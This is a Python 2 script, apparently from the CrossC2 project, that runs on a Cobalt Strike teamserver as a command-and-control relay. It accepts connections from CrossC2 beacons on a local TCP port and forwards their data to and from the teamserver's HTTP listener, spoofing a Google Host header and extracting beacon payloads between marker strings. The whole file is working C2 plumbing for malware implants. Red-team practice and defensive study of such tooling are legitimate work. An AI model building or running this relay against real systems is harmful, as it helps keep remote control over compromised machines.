# -*- coding: UTF-8 -*- 
import socket
import struct
import requests
import time
import base64

def read_tcp_cc2(s):
    recvdata = s.recv(10024)
    return recvdata

def write_tcp_cc2(s, data):
    s.send(data)


def read_udp_cc2(s):
    recvdata,_ = s.recvfrom(10024)
    return recvdata


def write_udp_cc2(s, data, addr):
    s.sendto(data, addr)


def find_beacon_data(prefix, suffix, data):
    s_index = data.find(prefix) + 1 # 1 = mask
    s_end = data.find(suffix)
    beacon_data = ''
    if (s_index > 0 and s_end > 0 and (s_index + len(prefix) + 1) != s_end):
        beacon_data = data[s_index + len(prefix):s_end]
        print('s_index = {}, s_end = {}', s_index, s_end)
    return beacon_data

def read_cs_teamserver(metadata):
    headers = { "HOST": "www.google.com",
                "Referer": "http://www.google.com/",
                "Accept": "accccccc",
                "User-Agent": "cc2_rebind_protocol_get_send",
                "Cookie": "SESSION={}".format(metadata),
                "Connection": "cc2_rebind_protocol_get_send"
    }
    res = requests.get("http://127.0.0.1:443/aaaaaaaaa", headers=headers)

    start = "ffffffff1"
    end = "eeeeeeee2"
    beacon_data = find_beacon_data(start, end, res.content)
    return beacon_data


def write_cs_teamserver(id, metadata):
    headers = { "HOST": "www.google.com",
                "Referer": "http://www.google.com/",
                "Accept": "accccccc",
                "User-Agent": "cc2_rebind_protocol_post_send",
                "Connection": "keep-alive",
                "Content-Length": "{}".format(len(metadata))
    }
    res = requests.post("http://127.0.0.1:443/bbbbbbbbb?SESSION={}".format(id), headers=headers, data=metadata)


def parseRawData(rawData):
    split = '->|<-'
    split_index = rawData.find(split)
    bid = rawData[:split_index]
    metadata = rawData[len(split)+split_index:]
    return bid,metadata


def cc2_tcp_server():
    print 'CrossC2 beacon TCP Server start:'
    sockobj = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sockobj.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR, 1)

    sockobj.bind(('127.0.0.1', 7777))
    sockobj.listen(1000)

    while True:
        connection, address = sockobj.accept( )
        print 'cc2 client alive: ', address

        msgHeader = connection.recv(7)
        print('msgHeader == ' + msgHeader)
        if msgHeader == 'read|||':
            data = read_tcp_cc2(connection)
            metadata = read_cs_teamserver(data)
            if len(metadata) > 0:
                print('beacon data : '+metadata)
                write_tcp_cc2(connection, metadata)
        elif msgHeader == 'write||':
            rawData = read_tcp_cc2(connection)
            bid, metadata = parseRawData(rawData)
            if len(metadata) > 0 and len(bid) > 0:
                # print('beacon raw: ' + rawData)
                # print('beacon post data: ' + metadata)
                # print('beacon id: ' + bid)
                write_cs_teamserver(bid, metadata)
        connection.close()

def main():
    # run on teamserver
    cc2_tcp_server()


if __name__ == '__main__':
    main()
